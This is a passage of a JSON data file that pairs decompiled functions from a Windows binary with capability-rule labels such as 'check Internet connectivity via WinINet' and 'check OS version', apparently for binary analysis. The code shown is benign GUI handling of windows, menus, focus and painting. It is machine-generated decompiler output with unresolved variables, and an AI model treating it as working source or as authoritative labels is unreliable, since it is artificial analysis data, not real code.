        "decompiled_code": "\nvoid __fastcall fcn.00456898(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t *piStack64;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = *param_2;\n    if (iVar5 < 0x47) {\n        if (iVar5 == 0x46) {\n            if (*0x456ccc == (*(in_EAX + 0x1c) & *0x456cc8)) {\n                if ((*(in_EAX + 0x230) - 1U < 2) && (*(in_EAX + 0x22b) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x230) == '\\x01') || (*(in_EAX + 0x230) == '\\x03')) &&\n                   ((*(in_EAX + 0x229) == '\\x02' || (*(in_EAX + 0x229) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x00456cb4;\n        }\n        if (iVar5 - 6U < 3) {\n            if (*0x483e10 == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n                iVar5 = 0;\n                if (*(in_EAX + 0x22f) == '\\x02') {\n                    iVar1 = fcn.004571c4();\n                    if (iVar1 != 0) {\n                        fcn.004571c4();\n                        iVar5 = fcn.0044407c();\n                    }\n                }\n                else if ((*(in_EAX + 0x220) != 0) && (*(in_EAX + 0x220) != in_EAX)) {\n                    iVar5 = fcn.0044407c();\n                }\n                if (iVar5 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x00456cb4;\n        }\n        if (iVar5 == 0x2b) {\n            piVar2 = param_2[2];\n            if (((*piVar2 == 1) && (*(in_EAX + 0x248) != 0)) && (iVar5 = fcn.004508a8(),  iVar5 != 0)) {\n                fcn.00426a54();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                iVar5 = sub.gdi32.dll_SaveDC();\n                piStack64 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.004270cc();\n                fcn.00426f6c();\n                piVar2 = piVar2 & 0xffff0000 | *(piVar2 + 4);\n                puStack72 = 0x456acc;\n                fcn.00451e68(piVar2);\n                *in_FS_OFFSET = piVar2;\n                piStack64 = 0x456ae3;\n                fcn.004270cc();\n                puStack72 = 0x456af3;\n                piStack64 = iVar5;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x00456cb4;\n        }\n        if (iVar5 == 0x2c) {\n            piVar2 = param_2[2];\n            if (((*piVar2 == 1) && (*(in_EAX + 0x248) != 0)) && (piVar3 = fcn.004508a8(),  piVar3 != NULL)) {\n                fcn.0044407c();\n                uVar4 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.00426a54();\n                piStack64 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x456b96;\n                iVar5 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x456bfb;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.004270cc();\n                fcn.00426f6c();\n                piVar2 = piVar2 + 4;\n                (**(*piVar3 + 0x38))();\n                *in_FS_OFFSET = piVar2;\n                uStack76 = 0x456c02;\n                piStack80 = 0x456bed;\n                fcn.004270cc();\n                piStack80 = iVar5;\n                sub.gdi32.dll_RestoreDC(uVar4);\n                return;\n            }\n            goto code_r0x00456cb4;\n        }\n    }\n    else {\n        if (iVar5 == 0xb01a) {\n            if (*(in_EAX + 0xa0) != 0) {\n                fcn.00403a28();\n            }\n            goto code_r0x00456cb4;\n        }\n        if (iVar5 == 0xb01b) {\n            if (*(in_EAX + 0xa0) != 0) {\n                fcn.00403a28();\n            }\n            goto code_r0x00456cb4;\n        }\n    }\n    if (iVar5 == *0x485b54) {\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        fcn.0043e9fc(0);\n        piStack64 = 0x456cb4;\n        fcn.0043e9fc(0);\n    }\ncode_r0x00456cb4:\n    piStack64 = 0x456cbe;\n    fcn.00441a58();\n    return;\n}\n",
        "token_count": 1475
    },
    "00456d5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456d5c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00426938();\n            puStack128 = 0x456dca;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.00456d5c::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x456dda;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x22f) == '\\x02') && (var_4h[0x95] != 0)) {\n                puStack136 = &fcn.00456d5c::var_5ch;\n                iStack140 = var_4h[0x95];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00426938();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.00456d5c::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x456e39;\n            fcn.00456cd0(&stack0xfffffffc);\n            if (*(var_4h + 0x22f) == '\\x02') {\n                iVar2 = fcn.004571f8();\n                if (iVar2 != 0) {\n                    puStack128 = 0x456e5c;\n                    fcn.00456d1c(&stack0xfffffffc);\n                }\n                fcn.0045400c();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x456d93;\n            fcn.00456cd0(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x456f37;\n            fcn.00456cd0(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0x95];\n        puStack132 = 0x456e9c;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x456f2a;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0x95];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.00456d5c::var_5ch);\n        fcn.0043d38c();\n        fcn.0043c184();\n    }\n    fcn.00441cf8();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x456f38;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0x95], &fcn.00456d5c::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 958
    },
    "00457040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457040(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    if (*(in_EAX + 0x91) == '\\0') {\n        *(in_EAX + 0x91) = 1;\n        uStack16 = 0x4570bd;\n        uStack20 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack20;\n        var_4h = in_EAX;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack12 = &stack0xfffffffc;\n                (**(*in_EAX + 0x70))();\n            }\n            else {\n                (**(*in_EAX + 0x70))();\n            }\n            (**(*var_4h + 0x6c))();\n        }\n        *in_FS_OFFSET = uStack20;\n        *(var_4h + 0x91) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "004571c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004571c4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x254), 0x229, 0, 0);\n        uVar1 = fcn.0043a70c();\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "004571f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004571f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) && (iVar1 = fcn.0045ad6c(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0045ad58();\n            if (*(iVar2 + 0x22f) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 183
    },
    "00457244": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00457244(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) && (iVar1 = fcn.0045ad6c(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0045ad58();\n            if ((*(iVar2 + 0x22f) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "004573f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004573f0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x22f)) {\n        if ((param_2 == '\\x01') && (*(in_EAX + 0x230) == '\\0')) {\n            fcn.00457754();\n        }\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            fcn.0044159c();\n        }\n        cVar1 = *(in_EAX + 0x22f);\n        *(in_EAX + 0x22f) = param_2;\n        if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1a5) == '\\0')) {\n            fcn.004577d0();\n            fcn.0043d9e8();\n        }\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            fcn.00441738();\n        }\n        if (param_2 == '\\x01') {\n            fcn.00456774();\n        }\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00457470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457470(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x248) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x248) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 600) != 0) {\n            uVar4 = fcn.0044d9a8();\n        }\n        uVar1 = fcn.0044407c();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x254), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.0044407c();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 268
    },
    "00457538": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00457538(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.0045ad6c(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.0045ad58();\n            if ((param_2 == *(iVar2 + 0x248)) && (iVar2 = fcn.0045ad58(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.0040675c();\n                fcn.0040c918(arg_8h, arg_ch);\n                fcn.00403fc0();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x248) != 0) {\n        fcn.00450f64();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x248) = param_2;\n    if ((param_2 == 0) || ((fcn.0042280c(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x229) == '\\x03')))) {\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.0044407c(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x248) + 0x5c) == '\\0') && (*(in_EAX + 0x22f) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x248) + 0x34))();\n            arg_8h = fcn.0044407c();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x248) + 0x34))();\n                arg_8h = fcn.0044407c();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.0044407c();\n            fcn.00450f64();\n        }\n    }\n    else if ((*(in_EAX + 0x22f) != '\\x01') && (cVar1 = fcn.00444380(),  cVar1 != '\\0')) {\n        uVar4 = fcn.0044407c(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x22e) != '\\0') {\n        fcn.00458604();\n    }\n    fcn.00457470();\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 916
    },
    "00457770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00457770(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x25c) != 0;\n}\n",
        "token_count": 49
    },
    "0045786c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045786c(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x22b)) && (*(in_EAX + 0x22b) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1a6) != '\\0')) {\n        uVar1 = fcn.0044407c(*(param_2 * 4 + 0x483e6c));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "004578ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004578ac(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x231) != '\\0') && (*(*0x485b48 + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x231) == '\\x02') {\n            iVar10 = fcn.004572c4();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x231) == '\\x03') && (*(*0x485b4c + 0x68) != 0)) {\n            iVar10 = fcn.004572c4();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x231) == '\\x01') {\n            iVar10 = fcn.0045ad28();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.004572c4();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.0045ad3c();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.0045ad28();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.0045ad3c(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.0045ad28(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x8c) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.0045ad28(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.0045aa2c();\n                                fcn.0045ad28(iVar4);\n                                iVar5 = fcn.0045aa10();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.0045ad28(iVar4 + iVar3);\n                                fcn.0045a9f8();\n                                fcn.0045ad28();\n                                fcn.0045aa44();\n                                (**(*in_EAX + 0x84))();\n                            }\n                            else if (*(in_EAX + 0x8c) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.0045ad28(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.0045aa2c();\n                                fcn.0045ad28(iVar4);\n                                iVar5 = fcn.0045aa10();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.0045ad28(iVar4 + iVar3);\n                                fcn.0045a9f8();\n                                fcn.0045ad28();\n                                fcn.0045aa44();\n                                (**(*in_EAX + 0x84))();\n                            }\n                            else {\n                                fcn.0045ad28(iVar10, iVar1, iVar11);\n                                iVar4 = fcn.0045a9f8();\n                                iVar3 = in_EAX[0x10];\n                                fcn.0045ad28();\n                                iVar5 = fcn.0045a9f8();\n                                fcn.0045ad28();\n                                iVar7 = fcn.0045a9f8();\n                                fcn.0045ad28();\n                                iVar8 = fcn.0045aa44();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar4 + iVar3) - iVar5)) {\n                                    fcn.0045ad28();\n                                    fcn.0045a9f8();\n                                    fcn.0045ad28();\n                                    fcn.0045aa44();\n                                }\n                                fcn.0045ad28();\n                                iVar3 = fcn.0045aa2c();\n                                iVar3 = iVar3 + in_EAX[0x11];\n                                fcn.0045ad28();\n                                iVar4 = fcn.0045aa2c();\n                                fcn.0045ad28();\n                                iVar5 = fcn.0045aa2c();\n                                fcn.0045ad28();\n                                iVar7 = fcn.0045aa10();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.0045ad28();\n                                    uVar9 = fcn.0045aa2c();\n                                    fcn.0045ad28(uVar9);\n                                    fcn.0045aa10();\n                                }\n                                (**(*in_EAX + 0x84))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1311
    },
    "00457f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457f60(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x458089;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x22f) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x485b48 + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x485b48 + 0x44) + 0x254) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.0040675c();\n            fcn.0040c8dc();\n            fcn.00403fc0();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x485668;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x485b48 + 0x44) + 0x254);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x180) = uVar1;\n        *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.004411cc();\n        *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) & 0xef;\n    }\n    fcn.0045a484();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.004045c8(0x458090);\n    return;\n}\n",
        "token_count": 763
    },
    "00458264": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00458264(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    *0x483e14 = *0x483e14 + 1;\n    if (*(in_EAX + 0x250) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x220) = 0;\n        }\n        else {\n            *(in_EAX + 0x220) = param_2;\n        }\n    }\n    *(*0x485b4c + 100) = param_2;\n    *(*0x485b4c + 0x68) = in_EAX;\n    fcn.0041c688();\n    fcn.0041c54c();\n    cVar2 = fcn.004039b8();\n    if (cVar2 == '\\0') {\n        *(*0x485b4c + 0x6c) = 0;\n    }\n    else {\n        *(*0x485b4c + 0x6c) = in_EAX;\n        fcn.0041c688();\n        fcn.0041c54c();\n    }\n    if ((*(param_2 + 0x54) & 0x20) == 0) {\n        *(param_2 + 0x54) = *(param_2 + 0x54) | *0x4584f8;\n        uVar4 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        if (in_EAX != *(*0x485b4c + 0x78)) {\n            if (*(*0x485b4c + 0x78) != 0) {\n                fcn.0044407c();\n                *(*0x485b4c + 0x78) = 0;\n                cVar2 = fcn.00454284();\n                if (cVar2 == '\\0') {\n                    param_2 = fcn.0040406c();\n                    goto code_r0x004584ed;\n                }\n            }\n            *(*0x485b4c + 0x78) = in_EAX;\n            fcn.0044407c();\n            cVar2 = fcn.00454284();\n            if (cVar2 == '\\0') {\n                param_2 = fcn.0040406c();\n                goto code_r0x004584ed;\n            }\n        }\n        if (*(in_EAX + 0x224) == 0) {\n            *(in_EAX + 0x224) = in_EAX;\n        }\n        if (*(in_EAX + 0x224) == param_2) {\ncode_r0x004584b3:\n            *in_FS_OFFSET = uVar4;\n            *(param_2 + 0x54) = ~*0x4584f8 & *(param_2 + 0x54);\n            return param_2;\n        }\n        do {\n            if ((*(in_EAX + 0x224) == 0) || (cVar2 = fcn.00440b20(),  cVar2 != '\\0')) goto code_r0x0045844a;\n            fcn.0044407c();\n            *(in_EAX + 0x224) = *(*(in_EAX + 0x224) + 0x30);\n            cVar2 = fcn.00454284();\n        } while (cVar2 != '\\0');\n        param_2 = fcn.0040406c();\n    }\n    goto code_r0x004584ed;\n    while( true ) {\n        do {\n            uVar3 = uVar4;\n            uVar4 = *(uVar3 + 0x30);\n        } while (uVar4 != *(in_EAX + 0x224));\n        *(in_EAX + 0x224) = uVar3;\n        fcn.0044407c();\n        cVar2 = fcn.00454284();\n        if (cVar2 == '\\0') break;\ncode_r0x0045844a:\n        uVar4 = param_2;\n        if (*(in_EAX + 0x224) == param_2) {\n            for (piVar1 = *(param_2 + 0x30); piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004039b8();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xcc))();\n                }\n            }\n            fcn.0043e9fc(param_2);\n            if ((*(in_EAX + 0x27c) != 0) && (*(in_EAX + 0x27c) != param_2)) {\n                uVar4 = 0;\n                fcn.0043e9fc(0);\n            }\n            goto code_r0x004584b3;\n        }\n    }\n    param_2 = fcn.0040406c();\ncode_r0x004584ed:\n    return param_2 & 0xffffff00;\n}\n",
        "token_count": 1165
    },
    "00458500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458500(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    uVar1 = fcn.0044407c();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.0044407c();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.0043e9fc(0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00458550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
